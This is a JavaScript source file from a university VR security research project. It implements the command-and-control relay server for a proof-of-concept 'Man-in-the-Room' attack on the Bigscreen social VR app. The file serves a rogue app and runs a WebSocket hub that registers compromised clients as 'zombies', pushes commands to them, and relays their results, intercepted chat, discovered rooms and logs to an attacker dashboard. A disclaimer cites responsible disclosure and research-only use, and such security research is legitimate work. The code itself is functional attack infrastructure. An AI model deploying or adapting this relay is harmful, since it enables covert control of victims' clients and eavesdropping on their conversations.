/**
 * Man-in-the-Room Attack and Command & Control Server Proof of Concept — Bigscreen
 *
 * Vondracek Martin mvondracek vondracek.mar@gmail.com
 *
 * Security and Forensics of Immersive Virtual Reality Social Applications
 * Cyber Forensics Research & Education Group                 https://www.unhcfreg.com/
 * Tagliatela College of Engineering                          https://www.newhaven.edu/engineering/
 * University of New Haven                                    https://www.newhaven.edu
 * 300 Boston Post Rd, West Haven, CT 06516
 *
 * DISCLAIMER: This software is a part of the cyber forensic research carried out by the research group UNHcFREG @ TCoE
 * at the University of New Haven, CT, USA. This software was developed as a proof of concept Man-in-the-Room attack.
 * Details concerning the research were kept private, the software vendor (Bigscreen, Inc.) was then contacted during
 * responsible disclosure. No harm has been done to the official infrastructure and users. Authors assume no liability
 * and are not responsible for any misuse or damage caused by this software. This software is intended as a proof
 * of concept only. The end user of this software agrees to use this software for education and research purposes only.
 */

'use strict';

const nodeStatic = require('node-static');
const http = require('http');
const WebSocket = require('ws');
require('log-timestamp');

//region Web server hosting the MitR Rogue App
let fileServer = new(nodeStatic.Server)();
let app = http.createServer(function(req, res) {
  fileServer.serve(req, res);
}).listen(8080);
console.debug('DEBUG', 'Static HTTP server started.');
//endregion

let zombies = {};
let dashboardWs = null; // websocket connection to the dashboard
const webSocketServer = new WebSocket.Server({port:8081});
webSocketServer.on('connection', function(ws) {
    console.log('New connection established.');
    ws.on('message', function(data) {
        let message = JSON.parse(data);
        console.debug(message);
        switch(message.type) {
            case 'dashboard-register':
                console.log('Dashboard WebSocket connected');
                if(dashboardWs !== null){
                    console.warn('WARN', 'Previous Dashboard WebSocket overwritten.')
                }
                dashboardWs = ws;
                break;
            case 'zombie-register': {
                if (dashboardWs === null){
                    console.error('ERROR', 'Dashboard WebSocket does not exist yet.', message);
                    return;
                }
                if (dashboardWs.readyState !== WebSocket.OPEN) {
                    console.error('ERROR', 'Dashboard WebSocket is not open. Cannot forward: %s', message);
                    return;
                }
                zombies[message.uuid] = ws;
                console.log('New zombie:', message.uuid);
                dashboardWs.send(data);
                break;
            }
            case 'zombie-cmd':
            case 'zombie-ping':
            {
                let destinationWs = zombies[message.uuid];
                if(destinationWs === null){
                    console.error('ERROR', 'Zombie Websocket with given id was not found', message.uuid);
                    return;
                }
                if (destinationWs.readyState !== WebSocket.OPEN) {
                    console.error('ERROR', 'Zombie WebSocket is not open. Cannot forward: %s', message);
                    return;
                }
                destinationWs.send(data);
                break;
            }
            case 'zombie-result':
            case 'zombie-pong':
            {
                if (dashboardWs === null){
                    console.error('ERROR', 'Dashboard WebSocket does not exist yet.', message);
                    return;
                }
                if(dashboardWs.readyState !== WebSocket.OPEN){
                    console.error('ERROR','Dashboard WebSocket is not open. Cannot forward: %s', message);
                    return;
                }
                dashboardWs.send(data);
                break;
            }
            case 'chat':
                if (dashboardWs === null){
                    console.error('ERROR', 'Dashboard WebSocket does not exist yet.', message);
                    return;
                }
                if(dashboardWs.readyState !== WebSocket.OPEN){
                    console.error('ERROR','Dashboard WebSocket is not open. Cannot forward: %s', message);
                    return;
                }
                dashboardWs.send(data);
                console.log('FWD: %s', data);
                break;
            case 'room-discovered':
                if (dashboardWs === null){
                    console.error('ERROR', 'Dashboard WebSocket does not exist yet.', message);
                    return;
                }
                if(dashboardWs.readyState !== WebSocket.OPEN){
                    console.error('ERROR','Dashboard WebSocket is not open. Cannot forward: %s', message);
                    return;
                }
                dashboardWs.send(data);
                console.log('FWD: %s', data);
                break;
            case 'log':
                if (dashboardWs === null){
                    console.error('ERROR', 'Dashboard WebSocket does not exist yet.', message);
                    return;
                }
                if(dashboardWs.readyState !== WebSocket.OPEN){
                    console.error('ERROR','Dashboard WebSocket is not open. Cannot forward: %s', message);
                    return;
                }
                dashboardWs.send(data);
                console.log('FWD: %s', data);
                break;
            default:
                console.warn('WARN', 'unexpected data', data);
        }
    });
});
console.debug('DEBUG', 'Relay WebSocket server started.');
console.log('In case of errors, please check `relayWebSocketServerUrl` and `webServerUrl` configuration' +
    ' of the Command and Control Dashboard.');
console.log('Please open Command and Control Dashboard in browser.');
